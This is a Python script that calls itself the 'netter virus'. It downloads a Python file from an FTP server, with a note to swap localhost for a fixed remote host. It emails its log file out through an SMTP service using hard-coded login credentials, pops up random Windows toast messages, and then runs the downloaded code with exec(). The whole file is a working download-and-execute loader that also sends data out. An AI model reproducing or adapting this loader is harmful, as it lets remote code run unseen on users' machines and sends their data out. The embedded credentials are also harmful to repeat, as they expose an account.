import sys
from ftplib import FTP
from datetime import datetime
import time
from zipfile import ZipFile, ZIP_DEFLATED

from win10toast import ToastNotifier
from random import *
import logging
import smtplib
from email.message import EmailMessage
from email.utils import make_msgid

WAIT_TIME = 5
"""The time to wait in seconds before executing the script"""

LOGFILE_NAME = 'netter_virus_logs.log'
"""The name of the log file"""

NOTIFICATION_CHANCE = 20
"""The chance for each run of a notification being sent to the user in percent"""

# TODO: Expand the list with more things
USER_TELL_STRINGS = [

    'Don\'t forget to drink Water.',
    'Never gonna give you up...',
    'The first bug was a literal bug that crawled into a computer system.'
]
"""The list of potentially useful things to tell the user"""


def ftp_connect():
    """Connect to the FTP server and return the connection"""

    logging.debug('Connecting to server...')
    ftp = FTP('localhost')  # TODO: Replace address with fixed remote host address
    # Login to the FTP server as anonymous user
    ftp.login()
    return ftp


def ftp_download(ftp):
    """Download the new file from the FTP server"""

    # Create the unique name under which the new file is to be stored based on the current date and time
    filename = datetime.now().strftime("%d-%M-%Y_%H-%M-%S")
    logging.info(f'Downloading file as {filename}.py')
    # Download the file and store it
    with open(f'{filename}.py', 'wb') as fp:
        logging.debug(ftp.retrbinary(f'RETR main.py', fp.write))
    return filename


def send_email():
    """Send an email about the current status, which includes the log file"""

    logging.debug('Sending mail about status')
    # Define sender and recipient of the email
    sender = "Private Person <from@example.com>"
    receiver = "A Test User <to@example.com>"
    # Initialize the email and pass it all needed data
    message = EmailMessage()
    message.set_content('Status update. Logfile attached.')
    message['subject'] = 'Status update from netter virus'
    message['to'] = receiver
    message['from'] = sender
    message['date'] = datetime.now()
    message['message-id'] = make_msgid()
    # Add the logfile to the email as attachment
    with open(LOGFILE_NAME) as fp:
        message.add_attachment(fp.read())
    # Send the email
    with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
        server.login("36438686bce063", "4954bd17d86bb6")  # TODO: Use a proper email service to actually send the email
        server.sendmail(sender, receiver, message.as_bytes())


def tell_user():
    """Say something potentially useful to the user taken from the USER_TELL_STRINGS list"""

    # To prevent spamming the user with notifications, there is only a 20% chance for one to be shown each run
    if randint(1, 100) <= NOTIFICATION_CHANCE:
        logging.info('Saying something to the user:')
        # Select a random string from the list
        notification_text = USER_TELL_STRINGS[randint(0, len(USER_TELL_STRINGS) - 1)]
        logging.info(notification_text)
        # Initialize the notification
        notification = ToastNotifier()
        # Pass data to the notification and show it
        notification.show_toast('Attention please', notification_text, duration=3)


def zip_logfile(filename: str):
    """Store a copy of the log file in a ZIP file with the same name as the last downloaded python file"""

    logging.debug('Zipping logfile')
    # Create a new ZIP file and copy the current log file into it
    with ZipFile(f'{filename}.zip', mode='w', compression=ZIP_DEFLATED) as z:
        z.write(f'{LOGFILE_NAME}')


def execute_file(filename: str):
    """Execute the previously downloaded file"""

    logging.debug(f'Opening and executing file {filename}')
    exec(open(f'{filename}.py').read())


if __name__ == '__main__':
    print('Running...')
    try:
        # Initialize logging
        logging.basicConfig(filename=LOGFILE_NAME, level=logging.DEBUG, format='%(asctime)s %(message)s')
        # Start execution
        connection = ftp_connect()
        name = ftp_download(connection)
        connection.close()
        send_email()
        tell_user()
        # Wait before continuing the process to give the user time to close the program
        logging.debug(f'Entering wait duration of {WAIT_TIME} seconds...')
        time.sleep(WAIT_TIME)
        # Continue with the execution
        zip_logfile(name)
        execute_file(name)
    except:
        # All exceptions are caught, this is to ensure that they get logged properly
        # If any exception occurs, the program is to log it and exit
        logging.exception('An error occurred')
        print('An error occurred, see the log file for further information.')
        sys.exit(1)
